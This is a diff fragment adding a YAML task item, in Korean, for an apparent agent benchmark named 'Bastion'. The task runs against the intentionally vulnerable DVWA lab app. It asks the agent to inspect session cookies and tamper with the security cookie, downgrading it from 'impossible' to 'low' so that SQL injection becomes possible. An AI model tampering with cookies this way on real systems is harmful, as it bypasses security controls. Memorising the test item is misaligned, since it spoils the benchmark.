+    4) DVWA(:8080)에 로그인하여 쿠키 구조를 분석하시오. Set-Cookie 헤더에서 세션 ID와 security 쿠키를 확인해줘
+
+    5) 쿠키 변조를 통한 보안 레벨 조작을 수행하시오. DVWA의 security 쿠키를 impossible에서 low로 변경하여 SQL Injection이
+    가능한 상태로 만들어라해줘'
+  hint: 복합 작업은 Bastion이 순서대로 계획하고 실행해야 한다
+  category: multi_task
+  points: 50
+  verify:
+    type: output_contains
+    expect: ''
+    field: stdout
+  target_vm: attacker
+  risk_level: low
+  answer: ''
+  answer_detail: Bastion이 5개 작업을 순차적으로 계획(planning)하고 실행(executing)한 뒤 종합 분석(validating)하는
+    다단계 작업.
+  script: ''
